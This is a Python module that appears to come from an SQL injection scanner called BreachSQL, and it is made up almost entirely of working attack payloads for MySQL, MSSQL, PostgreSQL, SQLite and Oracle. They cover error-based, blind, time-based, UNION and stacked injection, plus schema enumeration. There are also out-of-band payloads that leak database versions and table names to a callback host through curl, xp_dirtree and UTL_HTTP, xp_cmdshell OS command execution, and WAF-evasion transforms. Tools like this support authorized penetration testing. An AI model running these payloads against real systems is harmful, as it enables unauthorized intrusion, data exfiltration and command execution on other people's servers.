# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
BreachSQL — engine/_scanner/payloads.py
SQL injection payload sets and evasion transforms.

Structure:
  - ERROR_PAYLOADS   : per-DBMS payloads that trigger syntax/type errors
  - BOOLEAN_PAIRS    : (true_payload, false_payload) pairs for boolean-blind
  - TIME_PAYLOADS    : per-DBMS time-delay payloads
  - UNION_PROBES     : ORDER BY / UNION SELECT column-count probes
  - OOB_PAYLOADS     : per-DBMS out-of-band payloads (DNS/HTTP)
  - apply_evasion()  : transform a payload string for a given evasion strategy
"""

from __future__ import annotations

import random
import string
import urllib.parse
from typing import List, Tuple

from breachsql.engine.http.waf_detect import (
    EVASION_NONE,
    EVASION_SQL_COMMENT,
    EVASION_SQL_WHITESPACE,
    EVASION_SQL_CASE,
    EVASION_SQL_ENCODE,
    EVASION_SQL_MULTILINE,
    EVASION_CASE_MIXING,
    EVASION_DOUBLE_ENCODE,
    EVASION_NULL_BYTE,
)

# ---------------------------------------------------------------------------
# Unique marker for confirming reflection (union / error output)
# ---------------------------------------------------------------------------
BREACH_MARKER_PREFIX = "BreachSQL_"


def make_marker() -> str:
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{BREACH_MARKER_PREFIX}{suffix}"


# ---------------------------------------------------------------------------
# String concatenation probes
# Used to confirm SQLi by verifying the DB can concatenate strings.
# A successful concat means the injected expression was evaluated by the DB.
# Keys: per-DBMS concat syntax
# ---------------------------------------------------------------------------

CONCAT_PAYLOADS: dict[str, List[str]] = {
    "mysql": [
        # CONCAT() function — reflects 'foobar' if evaluated
        "' AND 1=1 AND CONCAT('foo','bar')='foobar'-- -",
        "' UNION SELECT CONCAT('foo','bar'),NULL-- -",
        "' UNION SELECT CONCAT(0x666f6f,0x626172),NULL-- -",  # hex-encoded
    ],
    "mariadb": [
        "' AND 1=1 AND CONCAT('foo','bar')='foobar'-- -",
        "' UNION SELECT CONCAT('foo','bar'),NULL-- -",
    ],
    "mssql": [
        # + operator for string concat
        "' AND 1=1 AND 'foo'+'bar'='foobar'-- -",
        "' UNION SELECT 'foo'+'bar',NULL-- -",
        "'; SELECT 'foo'+'bar'-- -",
    ],
    "postgres": [
        # || operator
        "' AND 1=1 AND 'foo'||'bar'='foobar'-- -",
        "' UNION SELECT 'foo'||'bar',NULL-- -",
    ],
    "sqlite": [
        # || operator
        "' AND 1=1 AND 'foo'||'bar'='foobar'-- -",
        "' UNION SELECT 'foo'||'bar',NULL-- -",
    ],
    "oracle": [
        # || operator, dual table required
        "' AND 1=1 AND 'foo'||'bar'='foobar'-- -",
        "' UNION SELECT 'foo'||'bar',NULL FROM dual-- -",
    ],
    "auto": [
        # Try generic forms that work across most DBMSes
        "' AND CONCAT('foo','bar')='foobar'-- -",
        "' AND 'foo'||'bar'='foobar'-- -",
        "' AND 'foo'+'bar'='foobar'-- -",
    ],
}


# ---------------------------------------------------------------------------
# Substring probes (used in blind data extraction)
# These probe whether SUBSTRING/SUBSTR is available and functional.
# Keys: per-DBMS substring syntax
# ---------------------------------------------------------------------------

SUBSTRING_PROBES: dict[str, List[str]] = {
    "mysql": [
        # SUBSTRING('foobar', 4, 2) = 'ba'
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
        "' AND MID('foobar',4,2)='ba'-- -",
    ],
    "mariadb": [
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
    ],
    "mssql": [
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
    ],
    "postgres": [
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
    ],
    "sqlite": [
        "' AND SUBSTR('foobar',4,2)='ba'-- -",
    ],
    "oracle": [
        "' AND SUBSTR('foobar',4,2)='ba'-- -",
    ],
    "auto": [
        "' AND SUBSTRING('foobar',4,2)='ba'-- -",
        "' AND SUBSTR('foobar',4,2)='ba'-- -",
    ],
}


def get_concat_payloads(dbms: str) -> List[str]:
    """Return string concatenation probe payloads for *dbms*."""
    return CONCAT_PAYLOADS.get(dbms, CONCAT_PAYLOADS["auto"])


def get_substring_probes(dbms: str) -> List[str]:
    """Return substring probe payloads for *dbms*."""
    return SUBSTRING_PROBES.get(dbms, SUBSTRING_PROBES["auto"])


def make_substring_payload(dbms: str, expr: str, pos: int, char: str) -> str:
    """
    Build a boolean-blind payload that checks whether the character at position
    *pos* (1-based) in the SQL expression *expr* equals *char*.

    Returns a true/false payload pair suitable for boolean-blind extraction.
    The returned string is the TRUE payload; swap the char to get the FALSE one.
    """
    substr_fn = "SUBSTR" if dbms in ("sqlite", "oracle") else "SUBSTRING"
    char_hex = hex(ord(char))  # e.g. 0x41 for 'A'
    # Use ASCII()/ORD() to avoid quoting issues with special chars
    ord_fn = "ASCII" if dbms in ("mysql", "mariadb", "mssql", "sqlite") else "ASCII"
    if dbms == "postgres":
        ord_fn = "ASCII"
    return f"' AND {ord_fn}({substr_fn}(({expr}),{pos},1))={ord(char)}-- -"


# ---------------------------------------------------------------------------
# Database contents enumeration payloads
# Query information_schema / system catalogs to list tables and columns.
# ---------------------------------------------------------------------------

DB_CONTENTS_PAYLOADS: dict[str, dict[str, List[str]]] = {
    "mysql": {
        "tables": [
            "' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1) AS SIGNED)-- -",
            "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))-- -",
        ],
        "columns": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1)))-- -",
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'-- -",
        ],
    },
    "mariadb": {
        "tables": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))-- -",
            "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -",
        ],
        "columns": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1)))-- -",
        ],
    },
    "mssql": {
        "tables": [
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
            "' UNION SELECT TOP 1 table_name,NULL FROM information_schema.tables-- -",
            "'; SELECT name FROM sysobjects WHERE xtype='U'-- -",
        ],
        "columns": [
            "' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns))-- -",
            "' UNION SELECT TOP 1 column_name,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'-- -",
        ],
    },
    "postgres": {
        "tables": [
            "' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)-- -",
            "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- -",
            "' AND 1=CAST((SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1) AS int)-- -",
        ],
        "columns": [
            "' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_schema='public' LIMIT 1) AS int)-- -",
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'-- -",
        ],
    },
    "sqlite": {
        "tables": [
            "' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS INTEGER)-- -",
            "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- -",
        ],
        "columns": [
            # SQLite PRAGMA — needs stacked queries or creative injection
            "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='TARGET_TABLE'-- -",
        ],
    },
    "oracle": {
        "tables": [
            "' AND 1=CAST((SELECT table_name FROM all_tables WHERE rownum=1) AS INTEGER)-- -",
            "' UNION SELECT table_name,NULL FROM all_tables WHERE rownum=1-- -",
            "' AND 1=CAST((SELECT table_name FROM user_tables WHERE rownum=1) AS INTEGER)-- -",
        ],
        "columns": [
            "' AND 1=CAST((SELECT column_name FROM all_tab_columns WHERE rownum=1) AS INTEGER)-- -",
            "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='TARGET_TABLE' AND rownum=1-- -",
        ],
    },
}


def get_db_contents_payloads(dbms: str, target: str = "tables") -> List[str]:
    """Return database contents enumeration payloads for *dbms*.

    *target* is either ``"tables"`` or ``"columns"``.
    """
    db_map = DB_CONTENTS_PAYLOADS.get(dbms, {})
    return db_map.get(target, [])


# ---------------------------------------------------------------------------
# Error-based payloads
# Keys: "generic", "mysql", "mariadb", "mssql", "postgres", "sqlite", "oracle"
# ---------------------------------------------------------------------------

ERROR_PAYLOADS: dict[str, List[str]] = {
    "generic": [
        "'",
        '"',
        "';",
        '";',
        "'-- -",
        '"-- -',
        "'#",
        # Paren-escape variants: covers WHERE x=('val') and LIKE ('%val%') contexts
        "')-- -",
        "'))-- -",
        "') --",
        "')) --",
        "' OR '1'='1",
        "' OR 1=1-- -",
        "' AND 1=CONVERT(int,'a')-- -",
        "1'",
        "1\"",
        "1`",
        "\\",
        "' AND EXTRACTVALUE(1,0x0a)-- -",
    ],
    "mysql": [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,VERSION())) USING utf8)))-- -",
        "1 AND EXP(~(SELECT * FROM(SELECT VERSION())a))-- -",
    ],
    "mariadb": [
        # MariaDB shares most MySQL error payloads but has a few unique functions
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "' AND JSON_VALUE('{\"a\":1}','$.b')-- -",
    ],
    "mssql": [
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
        "'; WAITFOR DELAY '0:0:0'-- -",    # safe probe, delay=0
        "' AND 1=1/0-- -",
        "' HAVING 1=1-- -",
        "' GROUP BY columnnames HAVING 1=1-- -",
        "'; EXEC xp_cmdshell('echo test')-- -",   # risk>=3 only — filtered in active.py
    ],
    "postgres": [
        "' AND 1=CAST((SELECT version()) AS int)-- -",
        "' AND 1=(SELECT 1 FROM pg_sleep(0))-- -",   # safe, delay=0
        "'; SELECT pg_sleep(0)-- -",
        "' UNION SELECT NULL,NULL,version()-- -",
        "' AND 1=1::integer-- -",
    ],
    "sqlite": [
        "' AND 1=CAST(sqlite_version() AS INTEGER)-- -",
        "' AND typeof(1)='integer'-- -",
        "' UNION SELECT sqlite_version(),NULL-- -",
        "' AND randomblob(1)-- -",
        "1' AND '1'='1",
        # Paren-escape variants for SQLite LIKE contexts
        "') AND 1=CAST(sqlite_version() AS INTEGER)-- -",
        "')) AND 1=CAST(sqlite_version() AS INTEGER)-- -",
    ],
    "oracle": [
        "' AND 1=CAST((SELECT banner FROM v$version WHERE rownum=1) AS INTEGER)-- -",
        "' AND 1=(SELECT 1 FROM dual WHERE 1=1)-- -",
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('invalid')-- -",
        "' UNION SELECT NULL,NULL FROM dual-- -",
        "' AND ROWNUM=1-- -",
        "1 AND 1=CAST((SELECT banner FROM v$version WHERE rownum=1) AS INTEGER)-- -",
    ],
}

# DB error signatures — used to detect which DBMS is present and confirm error-based SQLi
DB_ERROR_PATTERNS: dict[str, List[str]] = {
    "mysql": [
        r"you have an error in your sql syntax",
        r"warning: mysql",
        r"mysql_fetch",
        r"mysql_num_rows",
        r"supplied argument is not a valid mysql",
        r"unclosed quotation mark",
        r"extractvalue\(",
        r"updatexml\(",
    ],
    "mariadb": [
        r"mariadb.*error",
        r"you have an error in your sql syntax",
        r"warning: mariadb",
    ],
    "mssql": [
        r"microsoft sql server",
        r"incorrect syntax near",
        r"unclosed quotation mark after the character string",
        r"syntax error converting",
        r"mssql_query\(\)",
        r"odbc sql server driver",
        r"\[microsoft\]\[odbc",
    ],
    "postgres": [
        r"postgresql.*error",
        r"pg_query\(\)",
        r"pg_exec\(\)",
        r"psql.*error",
        r"invalid input syntax for",
        r"unterminated quoted string at or near",
        r"syntax error at or near",
        r"division by zero",
    ],
    "sqlite": [
        r"sqlite.*error",
        r"sqlite3\.",
        r"sqlite_step\(\)",
        r"near \".*\": syntax error",
        r"unrecognized token",
    ],
    "oracle": [
        r"ora-\d{5}",
        r"oracle.*error",
        r"quoted string not properly terminated",
        r"pl/sql.*error",
        r"from dual",
        r"missing right parenthesis",
    ],
    "generic": [
        r"sql syntax",
        r"sql error",
        r"syntax error",
        r"quoted string not properly terminated",
        r"microsoft ole db",
        r"error in your sql",
        r"unexpected end of sql command",
    ],
}


# ---------------------------------------------------------------------------
# Boolean-based payload pairs (true_payload, false_payload)
# ---------------------------------------------------------------------------

BOOLEAN_PAIRS: List[Tuple[str, str]] = [
    # Classic AND string context
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1-- -",  "' AND 1=2-- -"),
    ("' AND 1=1#",     "' AND 1=2#"),
    # Numeric context (no quotes needed)
    (" AND 1=1",       " AND 1=2"),
    (" AND 1=1-- -",   " AND 1=2-- -"),
    # Single-paren escape: WHERE x=('val') context
    ("') AND 1=1-- -",  "') AND 1=2-- -"),
    ("') AND 1=1 --",   "') AND 1=2 --"),
    # Double-paren escape: WHERE x LIKE ('%val%') context
    ("')) AND 1=1-- -", "')) AND 1=2-- -"),
    ("')) AND 1=1 --",  "')) AND 1=2 --"),
    # OR variants (risk>=2)
    ("' OR '1'='1", "' OR '1'='2"),
    ("' OR 1=1-- -",  "' OR 1=2-- -"),
    # Comment variants
    ("'/**/AND/**/1=1-- -", "'/**/AND/**/1=2-- -"),
    # Subquery
    ("' AND (SELECT 1)=1-- -", "' AND (SELECT 1)=2-- -"),
    # String length
    ("' AND LENGTH('a')=1-- -", "' AND LENGTH('a')=2-- -"),
]

# Only use OR-based pairs when risk >= 2 (they can modify data if stacked)
BOOLEAN_PAIRS_RISK2: List[Tuple[str, str]] = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("' OR 1=1-- -",  "' OR 1=2-- -"),
    ("1 OR 1=1",    "1 OR 1=2"),
]


# ---------------------------------------------------------------------------
# Time-based payloads
# Keys: "auto", "mysql", "mssql", "postgres", "sqlite"
# Placeholders: {delay} is replaced at runtime with opts.time_threshold
# ---------------------------------------------------------------------------

TIME_PAYLOADS: dict[str, List[str]] = {
    "auto": [
        # Try each DBMS in order; first one that works identifies the DB
        "' AND SLEEP({delay})-- -",
        "' AND SLEEP({delay})#",
        "' AND pg_sleep({delay})-- -",
        "'; WAITFOR DELAY '0:0:{delay}'-- -",
        "' AND randomblob(100000000)-- -",
        "' AND 1=(SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}))-- -",
        # Paren-escape contexts
        "')) AND SLEEP({delay})-- -",
        "')) AND pg_sleep({delay})-- -",
        "')) AND randomblob({blob_size})-- -",
    ],
    "mysql": [
        "' AND SLEEP({delay})-- -",
        "' AND SLEEP({delay})#",
        "' OR SLEEP({delay})-- -",
        "1' AND SLEEP({delay})-- -",
        " AND SLEEP({delay})-- -",
        "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -",
        "' AND BENCHMARK({bench},MD5(1))-- -",
        # Paren-escape contexts
        "') AND SLEEP({delay})-- -",
        "')) AND SLEEP({delay})-- -",
        "')) AND SLEEP({delay}) --",
    ],
    "mariadb": [
        "' AND SLEEP({delay})-- -",
        "' AND SLEEP({delay})#",
        " AND SLEEP({delay})-- -",
        "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -",
        "') AND SLEEP({delay})-- -",
        "')) AND SLEEP({delay})-- -",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:{delay}'-- -",
        "' AND 1=1; WAITFOR DELAY '0:0:{delay}'-- -",
        "'; IF (1=1) WAITFOR DELAY '0:0:{delay}'-- -",
        "')) ; WAITFOR DELAY '0:0:{delay}'-- -",
    ],
    "postgres": [
        "' AND pg_sleep({delay})-- -",
        "'; SELECT pg_sleep({delay})-- -",
        "' OR pg_sleep({delay})-- -",
        "' AND 1=1 AND pg_sleep({delay})-- -",
        "') AND pg_sleep({delay})-- -",
        "')) AND pg_sleep({delay})-- -",
    ],
    "sqlite": [
        "' AND randomblob({blob_size})-- -",   # {blob_size} = delay * 10_000_000
        "') AND randomblob({blob_size})-- -",
        "')) AND randomblob({blob_size})-- -",
        "')) AND randomblob({blob_size}) --",
    ],
    "oracle": [
        # Oracle has no simple sleep — use DBMS_PIPE.RECEIVE_MESSAGE (requires execute priv)
        # or heavy CPU via DECODE to simulate delay
        "' AND 1=(SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}))-- -",
        "' AND 1=(SELECT COUNT(*) FROM all_objects WHERE rownum<{bench})-- -",
    ],
}


# ---------------------------------------------------------------------------
# UNION-based probes
# ---------------------------------------------------------------------------

def order_by_probes(max_cols: int = 20) -> List[str]:
    """
    Generate ORDER BY N probes to determine column count.

    Six variants are emitted for each column count, covering SQL injection
    contexts:

    - String context (``'`` prefix): used when the param value is quoted
    - Single-paren escape (``')`` prefix): covers ``WHERE x = ('val')``
    - Double-paren escape (``'))`` prefix): covers ``WHERE x LIKE ('%val%')``
    - Numeric context (no prefix): used when the param is bare numeric
    - Two comment terminators each: ``-- -`` (ANSI) and ``#`` (MySQL)

    The probes are interleaved so the scanner tries all context styles before
    advancing to N+1 — allowing early termination on whatever context matches.
    """
    probes = []
    for n in range(1, max_cols + 1):
        probes.append(f"' ORDER BY {n}-- -")
        probes.append(f"' ORDER BY {n}#")
        probes.append(f"') ORDER BY {n}-- -")    # single-paren context
        probes.append(f"') ORDER BY {n}#")
        probes.append(f"')) ORDER BY {n}-- -")   # double-paren / LIKE context
        probes.append(f"')) ORDER BY {n} --")    # space before -- (SQLite style)
        probes.append(f" ORDER BY {n}-- -")      # numeric context
        probes.append(f" ORDER BY {n}#")         # numeric context, MySQL hash
    return probes


def union_null_probes(col_count: int, marker: str) -> List[str]:
    """
    Generate UNION SELECT probes for a known column count.

    For each column position, four variants are generated:
    - String context (``'`` prefix) + ``-- -`` comment
    - String context (``'`` prefix) + ``#`` comment
    - Numeric context (no prefix) + ``-- -`` comment
    - Numeric context (no prefix) + ``#`` comment

    Within each variant the marker is placed as a string literal at the
    target position and a ``CAST`` alternative is also emitted to handle
    type-strict DBMSes (PostgreSQL, MSSQL) where a string literal in an
    integer column would cause a type-mismatch error.
    """
    payloads = []
    for pos in range(col_count):
        # String literal marker (works for MySQL, SQLite)
        cols_str = ["NULL"] * col_count
        cols_str[pos] = f"'{marker}'"
        # CAST marker (works for PostgreSQL, MSSQL where column is typed)
        cols_cast = ["NULL"] * col_count
        cols_cast[pos] = f"CAST('{marker}' AS CHAR)"
        # Integer-padded variant: non-marker columns use sequential integers
        # (works for type-strict ORMs like Sequelize/SQLite that reject NULL)
        cols_int = [str(i + 1) for i in range(col_count)]
        cols_int[pos] = f"'{marker}'"

        for cols in (cols_str, cols_cast, cols_int):
            inner = ",".join(cols)
            # String context
            payloads.append(f"' UNION SELECT {inner}-- -")
            payloads.append(f"' UNION SELECT {inner}#")
            # Numeric context
            payloads.append(f" UNION SELECT {inner}-- -")
            payloads.append(f" UNION SELECT {inner}#")
            # Paren-escape contexts
            payloads.append(f"') UNION SELECT {inner}-- -")
            payloads.append(f"') UNION SELECT {inner}#")
            payloads.append(f"')) UNION SELECT {inner}-- -")
            payloads.append(f"')) UNION SELECT {inner}#")
    return payloads


# ---------------------------------------------------------------------------
# OOB payloads (require external callback URL)
# Placeholder: {callback} is the interactsh/burp collaborator domain
# ---------------------------------------------------------------------------

OOB_PAYLOADS: dict[str, List[str]] = {
    "mysql": [
        # DNS lookup (triggers DNS resolution of the callback hostname)
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{callback}','\\\\a'))--",
        "' AND (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,'{callback}',0x5c61)))--",
        # DNS lookup + data exfiltration (VERSION() embedded in subdomain)
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.{callback}\\\\a'))--",
        "' AND (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e,'{callback}',0x5c61)))--",
    ],
    "mariadb": [
        # MariaDB supports the same LOAD_FILE UNC-path DNS trick as MySQL
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{callback}','\\\\a'))--",
        # DNS + data exfiltration
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.{callback}\\\\a'))--",
    ],
    "mssql": [
        # DNS lookup
        "'; EXEC master..xp_dirtree '//{callback}/a'--",
        "'; EXEC master..xp_fileexist '//{callback}/a'--",
        # DNS lookup + data exfiltration (@@version embedded in UNC path hostname)
        "'; DECLARE @v varchar(1024);SET @v=(SELECT @@version);EXEC('master..xp_dirtree \"//'+@v+'.{callback}/a\"')--",
        "'; DECLARE @p varchar(1024);SET @p=(SELECT TOP 1 table_name FROM information_schema.tables);EXEC('master..xp_dirtree \"//'+@p+'.{callback}/a\"')--",
    ],
    "postgres": [
        # DNS lookup via dblink
        "' AND (SELECT dblink_send_query('host={callback}','SELECT 1'))--",
        # DNS lookup via COPY/curl
        "'; COPY (SELECT '') TO PROGRAM 'nslookup {callback}'--",
        # DNS lookup + data exfiltration (version embedded in curl URL subdomain)
        "'; DO $$DECLARE c text; BEGIN SELECT version() INTO c; EXECUTE 'COPY (SELECT '''') TO PROGRAM ''curl http://''||c||''.{callback}'''; END$$--",
        # Simpler exfil using dblink with data in host
        "'; CREATE OR REPLACE FUNCTION f() RETURNS void AS $f$ DECLARE v text; BEGIN SELECT version() INTO v; PERFORM dblink_send_query(''host=''||v||''.{callback}'',''SELECT 1''); END; $f$ LANGUAGE plpgsql; SELECT f()--",
    ],
    "sqlite": [],  # SQLite has no native OOB capability
    "oracle": [
        # DNS lookup
        "' UNION SELECT UTL_HTTP.REQUEST('http://{callback}/') FROM dual-- -",
        "' AND 1=(SELECT UTL_HTTP.REQUEST('http://{callback}/') FROM dual)-- -",
        # DNS lookup + data exfiltration (banner/version embedded in URL)
        "' UNION SELECT UTL_HTTP.REQUEST('http://'||(SELECT UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(banner))) FROM v$version WHERE rownum=1)||'.{callback}/') FROM dual-- -",
        # Simpler exfil via UTL_INADDR DNS lookup with data in hostname
        "' AND 1=(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1)||'.{callback}') FROM dual)-- -",
        # XXE-based DNS lookup (unpatched Oracle)
        "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{callback}/\"> %remote;]>'),'/l') FROM dual-- -",
    ],
    "auto": [
        "'; EXEC master..xp_dirtree '//{callback}/a'--",
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.{callback}\\\\a'))--",
        "'; COPY (SELECT '') TO PROGRAM 'nslookup {callback}'--",
        "' AND 1=(SELECT UTL_HTTP.REQUEST('http://{callback}/') FROM dual)-- -",
    ],
}


# ---------------------------------------------------------------------------
# Evasion transforms
# ---------------------------------------------------------------------------

def apply_evasion(payload: str, evasion: str) -> str:
    """Apply a WAF evasion transform to a raw SQL payload string."""
    if evasion == EVASION_NONE:
        return payload

    if evasion == EVASION_SQL_COMMENT:
        # Insert /**/ between SQL keywords (outside of string literals)
        result = payload
        for kw in ("SELECT", "UNION", "WHERE", "AND", "OR", "FROM", "INSERT", "UPDATE"):
            result = result.replace(kw, f"/**/{kw}/**/")
        return result

    if evasion == EVASION_SQL_WHITESPACE:
        # Replace spaces with tabs only (do NOT then replace tabs with CRLF —
        # that would double-convert spaces that were already replaced).
        return payload.replace(" ", "\t")

    if evasion == EVASION_SQL_CASE:
        # Randomise case of alpha characters in SQL keywords
        def _rand_case(m):
            return "".join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in m.group(0)
            )
        import re
        return re.sub(r"[A-Za-z]+", _rand_case, payload)

    if evasion == EVASION_SQL_ENCODE:
        # URL-encode the entire payload
        return urllib.parse.quote(payload, safe="")

    if evasion == EVASION_SQL_MULTILINE:
        # Wrap spaces in multi-line comments, but only outside single-quoted strings
        # to avoid corrupting WAITFOR DELAY '0:0:4' style payloads.
        result_parts: list[str] = []
        in_string = False
        for ch in payload:
            if ch == "'" and not in_string:
                in_string = True
                result_parts.append(ch)
            elif ch == "'" and in_string:
                in_string = False
                result_parts.append(ch)
            elif ch == " " and not in_string:
                result_parts.append("/*\n*/")
            else:
                result_parts.append(ch)
        return "".join(result_parts)

    if evasion == EVASION_CASE_MIXING:
        return payload.swapcase()

    if evasion == EVASION_DOUBLE_ENCODE:
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    if evasion == EVASION_NULL_BYTE:
        return payload + "%00"

    return payload


def get_error_payloads(dbms: str, risk: int) -> List[str]:
    """Return error-based payloads for *dbms* filtered by *risk* level."""
    generic = ERROR_PAYLOADS["generic"]
    specific = ERROR_PAYLOADS.get(dbms, []) if dbms != "auto" else []
    payloads = generic + specific
    # MSSQL xp_cmdshell only at risk 3
    if risk < 3:
        payloads = [p for p in payloads if "xp_cmdshell" not in p.lower()]
    return payloads


def get_boolean_pairs(risk: int) -> List[Tuple[str, str]]:
    """Return boolean payload pairs for the given risk level."""
    pairs = BOOLEAN_PAIRS.copy()
    if risk >= 2:
        pairs += BOOLEAN_PAIRS_RISK2
    return pairs


def get_time_payloads(dbms: str, delay: int) -> List[str]:
    """Return time-based payloads with {delay} and {bench}/{blob_size} substituted."""
    raw = TIME_PAYLOADS.get(dbms, TIME_PAYLOADS["auto"])
    bench = delay * 5_000_000        # MySQL BENCHMARK iterations
    blob_size = delay * 10_000_000   # SQLite randomblob bytes
    return [
        p.format(delay=delay, bench=bench, blob_size=blob_size)
        for p in raw
    ]


def get_oob_payloads(dbms: str, callback: str) -> List[str]:
    """Return OOB payloads with {callback} substituted."""
    # Extract just the hostname from the callback URL for DNS payloads
    parsed = urllib.parse.urlparse(callback)
    hostname = parsed.netloc or parsed.path or callback
    raw = OOB_PAYLOADS.get(dbms, OOB_PAYLOADS["auto"])
    return [p.format(callback=hostname) for p in raw]


# ---------------------------------------------------------------------------
# Stacked (batched) query payloads
# These inject a second query after the primary one using a semicolon.
# Not all databases or frameworks support stacked queries via their API.
# Oracle does NOT support stacked queries at all.
# ---------------------------------------------------------------------------

STACKED_PAYLOADS: dict[str, List[str]] = {
    "mysql": [
        # Stacked queries work in MySQL only with certain PHP/Python APIs
        "'; SELECT SLEEP(0)-- -",
        "'; SELECT 1-- -",
        "'; SELECT VERSION()-- -",
    ],
    "mariadb": [
        "'; SELECT SLEEP(0)-- -",
        "'; SELECT VERSION()-- -",
    ],
    "mssql": [
        # MSSQL fully supports stacked queries
        "'; SELECT 1-- -",
        "'; SELECT @@version-- -",
        "'; SELECT name FROM sysobjects WHERE xtype='U'-- -",
        "'; WAITFOR DELAY '0:0:0'-- -",
        # Risk 3: execute OS commands
        "'; EXEC xp_cmdshell('whoami')-- -",
    ],
    "postgres": [
        "'; SELECT 1-- -",
        "'; SELECT version()-- -",
        "'; SELECT current_database()-- -",
        "'; SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1-- -",
    ],
    "sqlite": [
        # SQLite supports multiple statements in some drivers
        "'; SELECT sqlite_version()-- -",
        "'; SELECT name FROM sqlite_master WHERE type='table' LIMIT 1-- -",
    ],
    "oracle": [],  # Oracle does NOT support stacked queries
    "auto": [
        "'; SELECT 1-- -",
        "'; SELECT version()-- -",
        "'; WAITFOR DELAY '0:0:0'-- -",
    ],
}


def get_stacked_payloads(dbms: str, risk: int) -> List[str]:
    """Return stacked query payloads for *dbms* filtered by *risk* level."""
    raw = STACKED_PAYLOADS.get(dbms, STACKED_PAYLOADS["auto"])
    if risk < 3:
        raw = [p for p in raw if "xp_cmdshell" not in p.lower()]
    return raw
